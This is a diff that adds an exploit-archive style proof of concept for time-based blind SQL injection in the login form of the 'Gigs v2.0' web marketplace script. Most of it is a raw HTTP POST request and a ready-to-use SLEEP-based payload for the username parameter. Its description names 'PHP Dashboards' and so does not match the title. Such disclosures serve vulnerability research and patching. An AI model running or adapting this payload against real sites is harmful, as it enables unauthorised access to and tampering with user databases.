@@ -1,0 +1,43 @@
+# Exploit Title: Gigs v2.0 - Login Page SQL Injection
+# Dork: N/A
+# Date: 23.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/gigs-services-marketplace/20716059
+# Version: v2.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : PHP Dashboards is prone to an SQL-injection vulnerability
+because it fails to sufficiently sanitize user-supplied data before using
+it in an SQL query.Exploiting this issue could allow an attacker to
+compromise the application, access or modify data, or exploit latent
+vulnerabilities in the underlying database.
+====================================================
+
+# PoC : SQLi :
+
+https://test.com/thegigs/user/dashboard/is_valid_login
+
+POST /thegigs/user/dashboard/is_valid_login HTTP/1.1
+Host: dreamguys.co.in
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/javascript
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://test.com/thegigs/
+Content-Length: 27
+Cookie: ci_session=33p2j7q2a35qt5vrjt1r0985pt2i0v7g
+Connection: keep-alive
+username=demo&password=1234
+
+Vulnerable Payload :
+
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=demo' AND SLEEP(5) AND 'NVll'='NVll&password=1234
+
+
+====================================================
